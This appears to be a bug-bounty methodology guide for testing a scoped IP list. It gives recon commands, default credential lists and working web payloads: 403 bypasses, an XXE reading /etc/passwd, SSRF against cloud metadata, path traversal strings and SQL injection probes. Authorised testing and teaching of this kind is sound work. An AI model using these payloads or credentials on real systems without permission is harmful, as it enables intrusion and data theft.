# IP List Workflow — All Services In Scope

## The Problem You're Having

You rustscan, nmap, ffuf, then stare at output hoping something jumps out.
That's recon without a hypothesis. You need to flip it: use recon output
to generate specific attack hypotheses, then test each one deliberately.

## Phase 1: Service Map (not just port list)

The goal isn't "find open ports." It's "understand what each IP is running
and what role it plays." Most hunters stop at port numbers. The bugs you
listed (open mail relay, default creds, RCE) come from understanding the
SERVICE, not the PORT.

```bash
# Fast port discovery
rustscan -a $(cat targets.txt | tr '\n' ',') -g -b 1500 | tee ports_raw.txt

# Deep service fingerprinting on discovered ports ONLY
# -sC runs default scripts (finds default creds, open relays, vulns automatically)
PORTS=$(grep '\->' ports_raw.txt | grep -oP '\[\K[^\]]+' | tr ',' '\n' | sort -un | tr '\n' ',' | sed 's/,$//')
nmap -sC -sV -p "$PORTS" -iL targets.txt -oN nmap_full.txt --script-timeout 30s
```

NOW: don't just skim the output. Categorize every host by what it IS:

```
Read nmap_full.txt and build a table:

IP            | Role              | Interesting Because
10.1.1.5      | Mail server       | SMTP 25 open, might be open relay
10.1.1.12     | Web app           | Tomcat 9.0.31 on 8080, manager interface?
10.1.1.20     | Database          | MySQL 3306 exposed, PostgreSQL 5432
10.1.1.33     | Web app + API     | nginx reverse proxy, 443 + 8443 + 9090
10.1.1.40     | Network device    | Cisco login page on 443, telnet 23
10.1.1.55     | File server       | FTP 21, SMB 445
10.1.1.60     | Dev/staging       | Jenkins 8080, Gitea 3000
```

This table IS your attack plan. Each row tells you exactly what to test.

## Phase 2: Non-HTTP Services First (everyone else skips these)

Other hunters finding "open mail relay" and "default admin creds" means
non-HTTP services are undertested. That's your edge.

### SMTP (25, 465, 587)
```bash
# Open relay check (nmap already does this with -sC, but manually:)
nmap --script smtp-open-relay -p 25 <ip>

# Manual check
telnet <ip> 25
EHLO test.com
MAIL FROM:<test@test.com>
RCPT TO:<external@gmail.com>
# If it accepts RCPT TO an external address without auth = open relay
```

### FTP (21)
```bash
# Anonymous login
ftp <ip>
# try: anonymous / anonymous

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 <ip>
```

### SMB (445, 139)
```bash
# Null session / guest access
smbclient -L //<ip>/ -N
smbclient //<ip>/share_name -N
# Browse for sensitive files: configs, backups, credentials

enum4linux -a <ip>
```

### Databases (3306, 5432, 1433, 27017, 6379)
```bash
# MySQL default/weak creds
mysql -h <ip> -u root -p       # try: root, empty, toor, password
mysql -h <ip> -u admin -p

# PostgreSQL
psql -h <ip> -U postgres       # try: postgres, empty, password

# Redis (usually no auth)
redis-cli -h <ip>
INFO
CONFIG GET *
KEYS *

# MongoDB (no auth common)
mongosh --host <ip>
show dbs
```

### Admin Panels on Non-Standard Ports
```bash
# Nmap already found these. Common ones:
# 8080 - Tomcat, Jenkins, Spring Boot
# 8443 - Alt HTTPS
# 9090 - Prometheus, Cockpit, WebLogic
# 9200 - Elasticsearch
# 2375 - Docker API (unauthenticated = RCE)
# 5000 - Docker Registry, Flask dev
# 6443 - Kubernetes API
# 10000 - Webmin

# For each: just open in browser first. Many have default creds.
```

### Default Credentials (this is how people find "default admin creds")
```
After identifying the service (Tomcat, Jenkins, Grafana, etc.),
try these BEFORE anything else:

Tomcat Manager:  tomcat:tomcat, admin:admin, tomcat:s3cret
Jenkins:         no auth required on /script (Groovy console = RCE)
Grafana:         admin:admin
Elasticsearch:   no auth (try: curl http://<ip>:9200/_cat/indices)
Kibana:          no auth (try: http://<ip>:5601)
Webmin:          root:password, admin:admin
Spring Actuator: no auth (try: /actuator, /actuator/env, /actuator/heapdump)
Docker API:      no auth (try: curl http://<ip>:2375/containers/json)
Kubernetes:      no auth (try: curl -k https://<ip>:6443/api)
```

## Phase 3: Web Services — Beyond Directory Fuzzing

Build HTTP targets from nmap output:
```bash
# From ports_raw.txt, build URLs for every HTTP-like service
grep '\->' ports_raw.txt | while read line; do
  host=$(echo "$line" | cut -d' ' -f1)
  ports=$(echo "$line" | grep -oP '\[\K[^\]]+' | tr ',' ' ')
  for port in $ports; do
    case $port in
      443|8443|4443|9443) echo "https://$host:$port" ;;
      80)                 echo "http://$host" ;;
      *)                  echo "http://$host:$port" ;;
    esac
  done
done | sort -u > http_targets.txt

# Probe which are actually alive
cat http_targets.txt | httpx -silent -sc -title -td -server -fr -json -o live.json
cat live.json | jq -r '.url' > live_urls.txt
```

### Step 3a: Identify the Application Stack

Don't fuzz blindly. First understand what you're hitting:
```bash
# What tech is running?
cat live.json | jq '{url: .url, status: .status_code, title: .title, tech: .tech, server: .webserver}'

# Now you know:
# - Is it a Java app? (look for deserialization, XXE, SSTI)
# - PHP app? (look for LFI, type juggling, SQLi)
# - .NET app? (look for viewstate deserialization, path traversal with backslash)
# - Node.js? (look for prototype pollution, NoSQLi, SSRF)
# - API gateway? (look for broken access control, IDOR, mass assignment)
```

### Step 3b: Smart Directory Fuzzing

The problem with raft-medium is it's generic. Tailor your wordlist
to the technology you identified:

```bash
# AFTER you know the tech stack, pick the RIGHT wordlist:

# Java/Tomcat/Spring
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -mc all -fc 404
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -mc all -fc 404

# PHP
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -mc all -fc 404

# API endpoints
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all -fc 404
ffuf -u http://target/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc all -fc 404

# Backup/config files (this is how people find API keys + sensitive files)
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200 -e .bak,.old,.conf,.config,.json,.xml,.yml,.yaml,.env,.sql,.log,.txt,.zip,.tar.gz

# Admin panels
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc all -fc 404
```

### Step 3c: After Fuzzing — What to Actually DO With Results

This is where you're getting stuck. You find directories but don't know
what to do with them. Here's the decision tree:

```
Found /admin or /login or /dashboard?
  → Try default creds (admin:admin, admin:password, etc.)
  → Check for registration endpoint (/register, /signup, /api/register)
  → Check for password reset flow (enumeration via different responses)
  → Check for 401/403 bypass (see bypass section below)

Found /api or /v1 or /v2 or /graphql?
  → Map ALL endpoints: GET/POST/PUT/DELETE on each
  → Look for IDOR: change numeric IDs, UUIDs in responses
  → Look for mass assignment: add extra JSON fields
  → Check for missing auth: remove cookies/tokens, does it still work?

Found .json/.xml/.yaml/.env/.config files?
  → READ THEM. API keys, database creds, internal URLs
  → .env files = immediate finding (sensitive disclosure)
  → config files with passwords = immediate finding

Found /backup/ or .bak or .old files?
  → Download and search for hardcoded credentials
  → Compare old vs new endpoints for removed-but-still-accessible features

Found /upload or file handling?
  → Test file upload bypass (see XXE section)
  → Test path traversal in filename parameter

Found 403 on interesting paths?
  → Don't skip these! Bypass them (see next section)
```

## Phase 4: 403 Bypass (this unlocks hidden surface)

Many of the bugs others found are behind 403 pages you walked past:

```bash
# Path-based bypasses
curl -s -o /dev/null -w "%{http_code}" https://target/admin
curl -s -o /dev/null -w "%{http_code}" https://target/admin/
curl -s -o /dev/null -w "%{http_code}" https://target/admin/.
curl -s -o /dev/null -w "%{http_code}" https://target//admin
curl -s -o /dev/null -w "%{http_code}" https://target/./admin
curl -s -o /dev/null -w "%{http_code}" https://target/admin..;/
curl -s -o /dev/null -w "%{http_code}" https://target/%2e/admin
curl -s -o /dev/null -w "%{http_code}" https://target/admin%20
curl -s -o /dev/null -w "%{http_code}" https://target/admin%09
curl -s -o /dev/null -w "%{http_code}" https://target/admin;

# Header-based bypasses
curl -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /admin" https://target/
curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" https://target/admin
curl -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" https://target/admin
curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-Host: 127.0.0.1" https://target/admin
curl -s -o /dev/null -w "%{http_code}" -H "X-Real-IP: 127.0.0.1" https://target/admin

# Method swap
curl -s -o /dev/null -w "%{http_code}" -X POST https://target/admin
curl -s -o /dev/null -w "%{http_code}" -X PUT https://target/admin
curl -s -o /dev/null -w "%{http_code}" -X PATCH https://target/admin
```

## Phase 5: Targeted Vulnerability Testing

Now that you've mapped the surface, test each hypothesis:

### XXE (XML External Entity)
Look for any endpoint that accepts XML:
```bash
# Find XML-accepting endpoints
# Content-Type: application/xml, text/xml
# File uploads that accept .xml, .xlsx, .docx, .svg

# Test payload on any XML input:
cat <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

# Also test on file uploads — .xlsx and .docx are ZIP'd XML:
# 1. Create a legit .xlsx
# 2. Unzip it
# 3. Inject XXE into xl/sharedStrings.xml or [Content_Types].xml
# 4. Rezip and upload
```

### SSRF
Look for any parameter that takes a URL or fetches remote content:
```bash
# Common param names: url=, uri=, path=, dest=, redirect=,
# src=, source=, link=, feed=, host=, site=, html=, img=,
# callback=, return=, page=, load=

# Test with Burp Collaborator or interact.sh:
curl "https://target/fetch?url=http://YOUR_COLLAB_URL"
curl "https://target/proxy?dest=http://169.254.169.254/latest/meta-data/"
```

### Path Traversal / LFI
```bash
# Test any parameter that references files:
# file=, path=, page=, template=, include=, doc=, pdf=, report=

curl "https://target/download?file=../../../etc/passwd"
curl "https://target/download?file=....//....//....//etc/passwd"
curl "https://target/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl "https://target/download?file=..%252f..%252f..%252fetc%252fpasswd"

# Windows targets:
curl "https://target/download?file=..\..\..\..\windows\win.ini"
```

### SQLi (beyond random parameter hoping)
```bash
# Don't fuzz random params. Focus on:
# 1. Login forms (username/password fields)
# 2. Search functionality
# 3. Sorting/ordering parameters (order=, sort=, column=)
# 4. ID parameters in API calls
# 5. Filter parameters

# Quick detection:
curl "https://target/search?q=test'"           # Error = possible SQLi
curl "https://target/search?q=test' OR '1'='1"
curl "https://target/api/users?sort=name;SLEEP(5)--"
curl "https://target/api/items?id=1 AND 1=1"
curl "https://target/api/items?id=1 AND 1=2"   # Different response = SQLi

# Use sqlmap ONLY after confirming injectable parameter:
sqlmap -u "https://target/search?q=test" --batch --level 3 --risk 2
```

## Phase 6: The Checklist (run through this for EVERY host)

```
For each IP/service, check:

[ ] Default credentials on every login panel
[ ] /robots.txt, /sitemap.xml, /.well-known/
[ ] /.git/, /.svn/, /.env, /wp-config.php.bak, /web.config
[ ] /server-status, /server-info (Apache)
[ ] /actuator, /actuator/env, /actuator/heapdump (Spring)
[ ] /elmah.axd, /trace.axd (.NET)
[ ] /phpinfo.php, /info.php
[ ] /graphql, /graphiql, /api/graphql (introspection enabled?)
[ ] /swagger, /swagger-ui, /api-docs, /openapi.json
[ ] /debug, /console, /shell
[ ] Directory listings (any 200 response showing file list)
[ ] CORS: Origin header reflection
[ ] Security headers missing (X-Frame-Options for clickjacking)
[ ] Cookie flags (missing Secure, HttpOnly, SameSite)
```
